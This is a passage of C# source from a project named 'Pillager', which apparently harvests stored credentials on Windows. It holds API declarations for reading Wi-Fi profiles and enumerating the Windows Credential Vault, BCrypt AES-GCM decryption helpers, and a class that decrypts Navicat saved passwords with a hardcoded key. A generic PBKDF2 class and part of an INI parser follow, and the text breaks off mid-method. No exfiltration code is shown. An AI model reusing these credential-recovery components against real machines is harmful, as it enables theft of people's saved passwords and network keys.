        public static extern uint WlanGetProfile([In] IntPtr clientHandle, [In, MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [In, MarshalAs(UnmanagedType.LPWStr)] string profileName, [In] IntPtr pReserved, [Out, MarshalAs(UnmanagedType.LPWStr)] out string profileXml, [In, Out, Optional] ref int flags, [Out, Optional] out IntPtr pdwGrantedAccess);

        [DllImport("wlanapi.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern uint WlanGetProfileList([In] IntPtr clientHandle, [In, MarshalAs(UnmanagedType.LPStruct)] Guid interfaceGuid, [In] IntPtr pReserved, ref IntPtr profileList);

        [StructLayout(LayoutKind.Sequential)]
        public struct WLAN_INTERFACE_INFO_LIST
        {

            public int dwNumberofItems;
            public int dwIndex;
            public WLAN_INTERFACE_INFO[] InterfaceInfo;


            public WLAN_INTERFACE_INFO_LIST(IntPtr pList)
            {
                dwNumberofItems = (int)Marshal.ReadInt64(pList, 0);
                dwIndex = (int)Marshal.ReadInt64(pList, 4);
                InterfaceInfo = new WLAN_INTERFACE_INFO[dwNumberofItems];
                for (int i = 0; i < dwNumberofItems; i++)
                {
                    IntPtr pItemList = new IntPtr(pList.ToInt64() + (i * 532) + 8);
                    var wii = (WLAN_INTERFACE_INFO)Marshal.PtrToStructure(pItemList, typeof(WLAN_INTERFACE_INFO));
                    InterfaceInfo[i] = wii;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_INTERFACE_INFO
        {
            public Guid InterfaceGuid;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strInterfaceDescription;

        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct WLAN_PROFILE_INFO
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string strProfileName;
            public WlanProfileFlags ProfileFLags;
        }

        [Flags]
        public enum WlanProfileFlags
        {
            AllUser = 0,
            GroupPolicy = 1,
            User = 2
        }

        public struct WLAN_PROFILE_INFO_LIST
        {
            public int dwNumberOfItems;
            public int dwIndex;
            public WLAN_PROFILE_INFO[] ProfileInfo;

            public WLAN_PROFILE_INFO_LIST(IntPtr ppProfileList)
            {
                dwNumberOfItems = (int)Marshal.ReadInt64(ppProfileList);
                dwIndex = (int)Marshal.ReadInt64(ppProfileList, 4);
                ProfileInfo = new WLAN_PROFILE_INFO[dwNumberOfItems];
                IntPtr ppProfileListTemp = new IntPtr(ppProfileList.ToInt64() + 8);

                for (int i = 0; i < dwNumberOfItems; i++)
                {
                    ppProfileList = new IntPtr(ppProfileListTemp.ToInt64() + i * Marshal.SizeOf(typeof(WLAN_PROFILE_INFO)));
                    ProfileInfo[i] = (WLAN_PROFILE_INFO)Marshal.PtrToStructure(ppProfileList, typeof(WLAN_PROFILE_INFO));
                }
            }
        }
        #endregion

        #region BCrypt
        public const uint ERROR_SUCCESS = 0x00000000;
        public const uint BCRYPT_PAD_PSS = 8;
        public const uint BCRYPT_PAD_OAEP = 4;

        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

        public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
        public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
        public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
        public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
        public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
        public static readonly string BCRYPT_AES_ALGORITHM = "AES";

        public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

        public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
        public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

        public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                              uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

        [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
        public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

        [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
        internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


        [DllImport("bcrypt.dll")]
        public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                  IntPtr hImportKey,
                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                  out IntPtr phKey,
                                                  IntPtr pbKeyObject,
                                                  int cbKeyObject,
                                                  byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                  int cbInput,
                                                  uint dwFlags);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        internal static extern uint BCryptDecrypt(IntPtr hKey,
                                                  byte[] pbInput,
                                                  int cbInput,
                                                  ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                  byte[] pbIV,
                                                  int cbIV,
                                                  byte[] pbOutput,
                                                  int cbOutput,
                                                  ref int pcbResult,
                                                  int dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_PSS_PADDING_INFO
        {
            public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
            {
                this.pszAlgId = pszAlgId;
                this.cbSalt = cbSalt;
            }

            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public int cbSalt;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
        {
            public int cbSize;
            public int dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAAD;
            public long cbData;
            public int dwFlags;

            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
            {
                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                if (iv != null)
                {
                    cbNonce = iv.Length;
                    pbNonce = Marshal.AllocHGlobal(cbNonce);
                    Marshal.Copy(iv, 0, pbNonce, cbNonce);
                }

                if (aad != null)
                {
                    cbAuthData = aad.Length;
                    pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                }

                if (tag != null)
                {
                    cbTag = tag.Length;
                    pbTag = Marshal.AllocHGlobal(cbTag);
                    Marshal.Copy(tag, 0, pbTag, cbTag);

                    cbMacContext = tag.Length;
                    pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                }
            }

            public void Dispose()
            {
                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_OAEP_PADDING_INFO
        {
            public BCRYPT_OAEP_PADDING_INFO(string alg)
            {
                pszAlgId = alg;
                pbLabel = IntPtr.Zero;
                cbLabel = 0;
            }

            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public IntPtr pbLabel;
            public int cbLabel;
        }
        #endregion

        #region VaultCli
        public enum VAULT_ELEMENT_TYPE
        {
            Undefined = -1,
            Boolean = 0,
            Short = 1,
            UnsignedShort = 2,
            Int = 3,
            UnsignedInt = 4,
            Double = 5,
            Guid = 6,
            String = 7,
            ByteArray = 8,
            TimeStamp = 9,
            ProtectedArray = 10,
            Attribute = 11,
            Sid = 12,
            Last = 13
        }

        public enum VAULT_SCHEMA_ELEMENT_ID
        {
            Illegal = 0,
            Resource = 1,
            Identity = 2,
            Authenticator = 3,
            Tag = 4,
            PackageSid = 5,
            AppStart = 100,
            AppEnd = 10000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_WIN8
        {
            public Guid SchemaId;
            public IntPtr pszCredentialFriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public IntPtr pPackageSid;
            public UInt64 LastModified;
            public UInt32 dwFlags;
            public UInt32 dwPropertiesCount;
            public IntPtr pPropertyElements;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_WIN7
        {
            public Guid SchemaId;
            public IntPtr pszCredentialFriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public UInt64 LastModified;
            public UInt32 dwFlags;
            public UInt32 dwPropertiesCount;
            public IntPtr pPropertyElements;
        }

        [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_ELEMENT
        {
            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type;
        }

        [DllImport("vaultcli.dll")]
        public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

        [DllImport("vaultcli.dll")]
        public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        public static extern int VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

        #endregion
    }
}

```

`Pillager/Helper/Navicat11Cipher.cs`:

```cs
using System;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Helper
{
    class Navicat11Cipher
    {

        private Blowfish blowfishCipher;

        protected static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        protected static void XorBytes(byte[] a, byte[] b, int len)
        {
            for (int i = 0; i < len; ++i)
                a[i] ^= b[i];
        }

        public Navicat11Cipher()
        {
            byte[] UserKey = Encoding.UTF8.GetBytes("3DC5CA39");
            var sha1 = new SHA1CryptoServiceProvider();
            sha1.TransformFinalBlock(UserKey, 0, UserKey.Length);
            blowfishCipher = new Blowfish();
            blowfishCipher.InitializeKey(sha1.Hash);
        }

        public Navicat11Cipher(string CustomUserKey)
        {
            byte[] UserKey = Encoding.UTF8.GetBytes(CustomUserKey);
            var sha1 = new SHA1CryptoServiceProvider();
            byte[] UserKeyHash = sha1.TransformFinalBlock(UserKey, 0, 8);
            blowfishCipher = new Blowfish();
            blowfishCipher.InitializeKey(UserKeyHash);
        }

        public string DecryptString(string ciphertext)
        {
            int BlockSize = 8;
            byte[] ciphertext_bytes = StringToByteArray(ciphertext);

            byte[] CV = Enumerable.Repeat<byte>(0xFF, BlockSize).ToArray();
            blowfishCipher.BlockEncrypt(CV, 0, CV, 0);

            byte[] ret = new byte[0];
            int blocks_len = ciphertext_bytes.Length / BlockSize;
            int left_len = ciphertext_bytes.Length % BlockSize;
            byte[] temp = new byte[BlockSize];
            byte[] temp2 = new byte[BlockSize];
            for (int i = 0; i < blocks_len; ++i)
            {
                Array.Copy(ciphertext_bytes, BlockSize * i, temp, 0, BlockSize);
                Array.Copy(temp, temp2, BlockSize);
                blowfishCipher.BlockDecrypt(temp, 0, temp, 0);
                XorBytes(temp, CV, BlockSize);
                ret = ret.Concat(temp).ToArray();
                XorBytes(CV, temp2, BlockSize);
            }

            if (left_len != 0)
            {
                Array.Clear(temp, 0, temp.Length);
                Array.Copy(ciphertext_bytes, BlockSize * blocks_len, temp, 0, left_len);
                blowfishCipher.BlockEncrypt(CV, 0, CV, 0);
                XorBytes(temp, CV, BlockSize);
                ret = ret.Concat(temp.Take(left_len).ToArray()).ToArray();
            }

            return Encoding.UTF8.GetString(ret);
        }
    }
}

```

`Pillager/Helper/Pbkdf2.cs`:

```cs
//Copyright (c) 2012 Josip Medved <jmedved@jmedved.com>

//2012-04-12: Initial version.


using System;
using System.Diagnostics.CodeAnalysis;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Helper
{
    /// <summary>
    /// Generic PBKDF2 implementation.
    /// </summary>
    /// <example>This sample shows how to initialize class with SHA-256 HMAC.
    /// <code>
    /// using (var hmac = new HMACSHA256()) {
    ///     var df = new Pbkdf2(hmac, "password", "salt");
    ///     var bytes = df.GetBytes();
    /// }
    /// </code>
    /// </example>
    [SuppressMessage("Microsoft.Naming", "CA1704:IdentifiersShouldBeSpelledCorrectly", MessageId = "Pbkdf", Justification = "Spelling is correct.")]
    public class Pbkdf2 {

        /// <summary>
        /// Creates new instance.
        /// </summary>
        /// <param name="algorithm">HMAC algorithm to use.</param>
        /// <param name="password">The password used to derive the key.</param>
        /// <param name="salt">The key salt used to derive the key.</param>
        /// <param name="iterations">The number of iterations for the operation.</param>
        /// <exception cref="System.ArgumentNullException">Algorithm cannot be null - Password cannot be null. -or- Salt cannot be null.</exception>
        public Pbkdf2(HMAC algorithm, byte[] password, byte[] salt, int iterations) {
            Algorithm = algorithm ?? throw new ArgumentNullException(nameof(algorithm), "Algorithm cannot be null.");
            Algorithm.Key = password ?? throw new ArgumentNullException(nameof(password), "Password cannot be null.");
            Salt = salt ?? throw new ArgumentNullException(nameof(salt), "Salt cannot be null.");
            IterationCount = iterations;
            BlockSize = Algorithm.HashSize / 8;
            BufferBytes = new byte[BlockSize];
        }

        /// <summary>
        /// Creates new instance.
        /// </summary>
        /// <param name="algorithm">HMAC algorithm to use.</param>
        /// <param name="password">The password used to derive the key.</param>
        /// <param name="salt">The key salt used to derive the key.</param>
        /// <exception cref="System.ArgumentNullException">Algorithm cannot be null - Password cannot be null. -or- Salt cannot be null.</exception>
        public Pbkdf2(HMAC algorithm, byte[] password, byte[] salt)
            : this(algorithm, password, salt, 1000) {
        }

        /// <summary>
        /// Creates new instance.
        /// </summary>
        /// <param name="algorithm">HMAC algorithm to use.</param>
        /// <param name="password">The password used to derive the key.</param>
        /// <param name="salt">The key salt used to derive the key.</param>
        /// <param name="iterations">The number of iterations for the operation.</param>
        /// <exception cref="System.ArgumentNullException">Algorithm cannot be null - Password cannot be null. -or- Salt cannot be null.</exception>
        public Pbkdf2(HMAC algorithm, string password, string salt, int iterations) :
            this(algorithm, UTF8Encoding.UTF8.GetBytes(password), UTF8Encoding.UTF8.GetBytes(salt), iterations) {
        }

        /// <summary>
        /// Creates new instance.
        /// </summary>
        /// <param name="algorithm">HMAC algorithm to use.</param>
        /// <param name="password">The password used to derive the key.</param>
        /// <param name="salt">The key salt used to derive the key.</param>
        /// <exception cref="System.ArgumentNullException">Algorithm cannot be null - Password cannot be null. -or- Salt cannot be null.</exception>
        public Pbkdf2(HMAC algorithm, string password, string salt) :
            this(algorithm, password, salt, 1000) {
        }


        private readonly int BlockSize;
        private uint BlockIndex = 1;

        private byte[] BufferBytes;
        private int BufferStartIndex;
        private int BufferEndIndex;


        /// <summary>
        /// Gets algorithm used for generating key.
        /// </summary>
        public HMAC Algorithm { get; private set; }

        /// <summary>
        /// Gets salt bytes.
        /// </summary>
        [SuppressMessage("Microsoft.Performance", "CA1819:PropertiesShouldNotReturnArrays", Justification = "Byte array is proper return value in this case.")]
        public byte[] Salt { get; private set; }

        /// <summary>
        /// Gets iteration count.
        /// </summary>
        public int IterationCount { get; private set; }


        /// <summary>
        /// Returns a pseudo-random key from a password, salt and iteration count.
        /// </summary>
        /// <param name="count">Number of bytes to return.</param>
        /// <returns>Byte array.</returns>
        public byte[] GetBytes(int count) {
            byte[] result = new byte[count];
            int resultOffset = 0;
            int bufferCount = BufferEndIndex - BufferStartIndex;

            if (bufferCount > 0) { //if there is some data in buffer
                if (count < bufferCount) { //if there is enough data in buffer
                    Buffer.BlockCopy(BufferBytes, BufferStartIndex, result, 0, count);
                    BufferStartIndex += count;
                    return result;
                }
                Buffer.BlockCopy(BufferBytes, BufferStartIndex, result, 0, bufferCount);
                BufferStartIndex = BufferEndIndex = 0;
                resultOffset += bufferCount;
            }

            while (resultOffset < count) {
                int needCount = count - resultOffset;
                BufferBytes = Func();
                if (needCount > BlockSize) { //we one (or more) additional passes
                    Buffer.BlockCopy(BufferBytes, 0, result, resultOffset, BlockSize);
                    resultOffset += BlockSize;
                } else {
                    Buffer.BlockCopy(BufferBytes, 0, result, resultOffset, needCount);
                    BufferStartIndex = needCount;
                    BufferEndIndex = BlockSize;
                    return result;
                }
            }
            return result;
        }


        private byte[] Func() {
            var hash1Input = new byte[Salt.Length + 4];
            Buffer.BlockCopy(Salt, 0, hash1Input, 0, Salt.Length);
            Buffer.BlockCopy(GetBytesFromInt(BlockIndex), 0, hash1Input, Salt.Length, 4);
            var hash1 = Algorithm.ComputeHash(hash1Input);

            byte[] finalHash = hash1;
            for (int i = 2; i <= IterationCount; i++) {
                hash1 = Algorithm.ComputeHash(hash1, 0, hash1.Length);
                for (int j = 0; j < BlockSize; j++) {
                    finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
                }
            }
            if (BlockIndex == uint.MaxValue) { throw new InvalidOperationException("Derived key too long."); }
            BlockIndex += 1;

            return finalHash;
        }

        private static byte[] GetBytesFromInt(uint i) {
            var bytes = BitConverter.GetBytes(i);
            if (BitConverter.IsLittleEndian) {
                return new[] { bytes[3], bytes[2], bytes[1], bytes[0] };
            }

            return bytes;
        }

    }
}

```

`Pillager/Helper/Pixini.cs`:

```cs
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Helper
{
    /// <summary>
    /// As far as Pixini is concerned, each line of text
    //  that it parses is one of these
    /// </summary>
    public enum LineType : byte
    {
        None,
        Comment,
        KeyValue,
        Section,
    }

    /// <summary>
    /// This struct contains info about a single ini line
    /// </summary>
    public struct IniLine
    {
        public LineType type;
        public string section;
        public string comment;
        public string key;
        public string value;

        /// <summary>
        /// True if this IniLine is an array
        /// </summary>
        public bool IsArray => array != null;

        /// <summary>
        /// This is for comma separated values. If Pixini detects a valid CSV, it
        /// will separate them and stick them in this array. Note that while the 
        /// full unseparated value will still be available in the value field,
        /// this will be the field that is used when the ini data is output.
        /// </summary>
        public string[] array;

        /// <summary>
        /// if this is != 0, then the value was quoted with this char
        /// </summary>
        public char quotechar;
    }

    /// <summary>
    /// This class contains string extensions that Pixini uses
    /// </summary>
    static class StringExtensions
    {
        /// <summary>
        /// Checks to see if the string is just whitespace
        /// Note: A similar version method exists in later .NET versions (IsNullOrWhiteSpace)
        /// </summary>
        /// <param name="input"></param>
        /// <returns></returns>
        public static bool IsWhiteSpace(this string input)
        {
            //check for any Non-whitespace characters in the string
            foreach (var t in input)
            {
                if (!char.IsWhiteSpace(t)) return false;
            }

            return true;
        }

        /// <summary>
        /// Figures out how many times the given character occurs in the given string
        /// </summary>
        /// <param name="text"></param>
        /// <param name="c"></param>
        /// <param name="startIndex"></param>
        /// <param name="endIndex"></param>
        /// <returns></returns>
        public static int CountChar(this string text, char c, int startIndex = 0, int endIndex = -1)
        {
            int cnt = 0;
            if (endIndex == -1) endIndex = text.Length;

            for (int i = startIndex; i < endIndex; i++)
            {
                if (text[i] == c) cnt++;
            }
            return cnt;
        }
    }

    /// <summary>
    /// Pixini works with ini data. It knows how to load, change values and save ini data
    /// It is designed to work with .NET 3.5 (mono 2.0). Also no Regex objects are used.
    /// Notes:
    /// Leading a trailing spaces around values or key names are removed. If you want the spaces, enclose the string in double or single quotes
    /// </summary>
    public class Pixini
    {
        /// <summary>
        /// If a key/value is not under a specific section, it goes in the default section
        /// </summary>
        const string DEFAULT_SECTION = "default";

        /// <summary>
        /// This just holds the default section lower-cased. we need this so we can do
        /// case-insensitive compares but still keep the case
        /// </summary>
        static string defaultSectionLowerCased;

        /// <summary>
        /// This is the separator character that Pixini will use when looking for a Key/Value Pair.
        /// Change this to your liking... 
        /// </summary>
        public char inputKVSeparator = '=';

        /// <summary>
        /// <summary>
        /// This is the separator character that Pixini will use when outputting a Key/Value Pair
        /// According to the specs, it is supposed to be the '=' sign but it is changeable here for your pleasure
        /// </summary>
        public char outputKVSeparator = '=';

        /// Subscribe to this event to be notified of any warnings that occur during parsing
        /// </summary>
        public event Action<string> LogWarning;

        /// <summary>
        /// Subscribe to this event to be notified of any errors that occur during parsing
        /// </summary>
        public event Action<string> LogError;

        /// <summary>
        /// Tells us what line number the parser is on
        /// </summary>
        int lineNumber = 1;

        /// <summary>
        /// This dictionary Holds all the sections found in the ini file and is 
        /// also used to hold newly-constructed sections
        /// </summary>
        public Dictionary<string, List<IniLine>> sectionMap;

        /// <summary>
        /// Contains the structure of the sections of the ini file. Which sections are in what order
        ///  We use this to reconstruct the ini file in its approximate order
        /// </summary>
        List<string> structureOrder;

        /// <summary>
        /// Tells is which section of the ini file we are on
        /// </summary>
        string currentSection;

        #region Output Formatting Options
        /// <summary>
        /// Adds an empty line between the end of one section and the beginning of another
        /// </summary>
        public bool emptyLinesBetweenSections = true;

        /// <summary>
        /// Puts an empty line above a comment when it proceeds a key value
        /// </summary>
        public bool emptyLineAboveComments = true;

        /// <summary>
        /// Puts empty lines between all KeyValuePairs
        /// </summary>
        public bool emptyLinesBetweenKeyValuePairs = false;

        /// <summary>
        /// If true, then spaces are inserted between the = sign of a key value pair
        /// </summary>
        //public bool spaceBetweenEquals = false;
        #endregion

        #region Properties

        /// <summary>
        /// Gets/sets a key for the given section name
        /// If attempting to set a key that does not exist, it is created
        /// </summary>
        /// <param name="sectionName">The section from which to get/set the key</param>
        /// <param name="key">The key to get/set</param>
        /// <returns>the value string or null if not found</returns>
        public string this[string key, string sectionName = DEFAULT_SECTION]
        {
            get
            {
                if (!GetLineInfo(key, sectionName, out IniLine iniLine))
                    return null;
                return iniLine.value;
            }

            set
            {
                //Section names and key names are case insensitive 
                var sectionNameLowerCase = sectionName.ToLower();
                var keyLowerCase = key.ToLower();

                if (sectionMap.TryGetValue(sectionNameLowerCase, out List<IniLine> section))
                {
                    IniLine iniLine;
                    int index = -1;
                    //Search through the list to find the key if it exists
                    for (int i = 0; i < section.Count; i++)
                    {
                        if (section[i].type != LineType.KeyValue) continue;

                        if (section[i].key.ToLower() == keyLowerCase)
                        {
                            index = i;
                        }
                    }

                    if (index > -1)
                    {
                        iniLine = section[index];

                        //If ParseValue returns false just set it = value
                        if (ParseValue(value, 0, out var info))
                        {
                            iniLine.value = info.value;
                            iniLine.quotechar = info.quotechar;
                            iniLine.array = info.array;
                        }
                        else
                        {
                            iniLine.value = value;
                            iniLine.array = null;
                        }
                        section[index] = iniLine;
                    }
                    else
                    {
                        if (!ParseValue(value, 0, out var info))
                            section.Add(new IniLine { type = LineType.KeyValue, section = sectionName, key = key, value = value, quotechar = '\0' });
                        else
                        {
                            info.section = sectionName;
                            info.key = key;
                            section.Add(info);
                        }
                    }
                }
                else
                {
                    sectionMap[sectionName] = new List<IniLine>();

                    //Add the new Section Name if needed
                    AddIniLine(new IniLine { type = LineType.Section, section = sectionName });

                    //Set the current section to the new one we just created
                    if (!ParseValue(value, 0, out var info))
                        AddIniLine(new IniLine { type = LineType.KeyValue, section = sectionName, key = key, value = value });
                    else
                    {
                        info.section = sectionName;
                        info.key = key;
                        AddIniLine(info);
                    }
                }
            }
        }

        /// <summary>
        /// Returns an array with the sections contined in the parsed ini file
        /// </summary>
        public string[] SectionNames => sectionMap.Keys.ToArray();

        #endregion

        static Pixini()
        {
            defaultSectionLowerCased = DEFAULT_SECTION.ToLower();
        }

        public Pixini() => Init();

        void Init()
        {
            structureOrder = new List<string>();
            sectionMap = new Dictionary<string, List<IniLine>>();
            lineNumber = 1;

            //Add a default section
            currentSection = DEFAULT_SECTION;
        }

        #region I/O
        /// <summary>
        /// Loads and parses an existing ini file given the filename
        /// </summary>
        /// <param name="filename">The name of an existing ini file</param>
        /// <returns></returns>
        public static Pixini Load(string filename)
        {
            var ini = new Pixini();

            using (var sr = new StreamReader(filename))
            {
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    //Parse the line
                    ini.Parse(line.Trim());
                }
            }
            //Do any necessary post-processing after all the file is loaded and parsed
            ini.PostProcess();

            return ini;
        }

        /// <summary>
        /// Loads and parses an ini file from a string
        /// </summary>
        /// <param name="text">The string containing the ini text</param>
        /// <returns></returns>
        public static Pixini LoadFromString(string text)
        {
            var ini = new Pixini();

            using (var sr = new StringReader(text))
            {
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    //Parse the line
                    ini.Parse(line.Trim());
                }
            }

            //Do any necessary post-processing after all the file is loaded and parsed
            ini.PostProcess();

            return ini;
        }

        /// <summary>
        /// Saves the ini info to the given filename
        /// </summary>
        /// <param name="filename">The name of a file to which the ini data will be saved</param>
        /// <param name="saveBackupOfPrevious">If true and a previous file with the same name existsm it will be copied to filename.bak </param>
        public void Save(string filename, bool saveBackupOfPrevious = false)
        {
            //Save a backup if 
            if (saveBackupOfPrevious && File.Exists(filename))
            {
                File.Copy(filename, Path.GetFileNameWithoutExtension(filename) + ".bak");
            }

            //Make sure we handle the default section case
            HandleDefaultSection();

            using (var sw = new StreamWriter(filename))
            {
                //Write out all the lines to the given filename
                var enumerator = Lines();

                while (enumerator.MoveNext())
                {
                    if (enumerator.Current != null)
                        sw.WriteLine(enumerator.Current);
                }
            }
        }
        #endregion

        #region Getters/Setters

        /// <summary>
        /// Gets the desired value from the given key/section. This works when 'T'
        /// is either float, int, string, or bool. Other types are not currently supported
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="key"></param>
        /// <param name="sectionName"></param>
        /// <param name="defaultVal"></param>
        /// <returns></returns>
        public T Get<T>(string key, string sectionName = DEFAULT_SECTION, T defaultVal = default)
        {
            string val = this[key, sectionName];

            var converter = TypeDescriptor.GetConverter(typeof(T));

            if (string.IsNullOrEmpty(val) || !converter.CanConvertFrom(typeof(string)))
            {
                return defaultVal;
            }

            try
            {
                var Tval = converter.ConvertFrom(val);
                return (T)Tval;
            }
            catch
            {
                //eat the exception and return the default value
                return defaultVal;
            }
        }

        public void Set<T>(string key, string sectionName, T val) => this[key, sectionName] = val.ToString();

        public void Set<T>(string key, T val) => this[key] = val.ToString();

        #endregion

        #region Array Getters/Setters

        /// <summary>
        /// Gets the array associated with this key in this section given that one exists
        /// Note: This works when 'T' is either double, float, int, string, or bool. Other types are not currently supported
        /// Note: The array returned here can be DIRECTLY modified and the changes will show
        /// up when rendering the ini data. Be careful thought. If you want to change the size of the
        /// array, then you must use the ArrSet() method instead!
        /// </summary>
        /// <param name="key"></param>
        /// <param name="sectionName"></param>
        /// <returns>The array or null if it does not exist or cannot be converted to the given type T</returns>
        public T[] GetArr<T>(string key, string sectionName = DEFAULT_SECTION)
        {
            var converter = TypeDescriptor.GetConverter(typeof(T));
            if (!GetLineInfo(key, sectionName, out var iniLine) || iniLine.array == null)
                return null;
            T[] arr = iniLine.array.Select(val =>
            {
                if (string.IsNullOrEmpty(val) || !converter.CanConvertFrom(typeof(string)))
                {
                    return default(T);
                }

                try
                {
                    var Tval = converter.ConvertFrom(val);
                    return (T)Tval;
                }
                catch
                {
                    //eat the exception and return the default value
                    return default(T);
                }
            }).ToArray();
            return arr;
        }

        /// <summary>
        /// Sets an array on the given key in the given section
        /// </summary>
        /// <param name="key"></param>
        /// <param name="section"></param>
        /// <param name="vals"></param>
        /// <returns>true on success, false otherwise</returns>
        public bool SetA<T>(string key, string sectionName, params T[] vals)
        {
            if (!GetLineInfo(key, sectionName, out var iniLine) || iniLine.array == null)
                return false;
            iniLine.value = null;
            iniLine.array = vals.Select(val => val.ToString()).ToArray();
            iniLine.quotechar = '\0';

            //Since we are dealing with structs, we must replace the actual struct instance in the section list...
            ReplaceIniLine(iniLine);
            return true;
        }

        public bool SetA<T>(string key, params T[] vals) => SetA(key, DEFAULT_SECTION, vals);

        #endregion

        #region Other Operations

        public bool SectionExists(string sectionName)
        {
            if (string.IsNullOrEmpty(sectionName)) return false;
            return sectionMap.ContainsKey(sectionName.ToLower());
        }

        /// <summary>
        /// Removes the given key from the given section
        /// </summary>
        /// <param name="sectionName">Name of the desired section</param>
        /// <param name="key">Name of the key to be removed</param>
        /// <returns>True if the key was found and removed, false if it was not found</returns>
        public bool Delete(string key, string sectionName)
        {
